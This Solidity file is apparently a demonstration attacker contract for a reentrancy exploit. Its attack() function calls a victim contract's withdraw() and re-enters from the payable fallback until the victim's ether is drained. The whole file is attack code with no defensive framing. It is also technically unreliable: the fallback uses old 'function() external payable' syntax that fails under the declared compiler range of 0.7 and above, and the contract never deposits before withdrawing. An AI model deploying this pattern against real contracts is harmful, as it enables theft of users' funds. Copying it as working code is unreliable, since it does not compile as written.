// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface VictimContractInterface {
    function withdraw() external payable;
}

contract AttackerContract {
    VictimContractInterface victim;

    constructor(address _victim) {
        victim = VictimContractInterface(_victim);
    }

    // Trigger the attack
    function attack() public payable {
        if (address(victim).balance > 0) {
            victim.withdraw();
        }
    }

    function() external payable {
        // attack if still funds to withdrawl
        attack();
    }

    function getAttackerBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getVictimBalance() public view returns (uint256) {
        return address(victim).balance;
    }
}
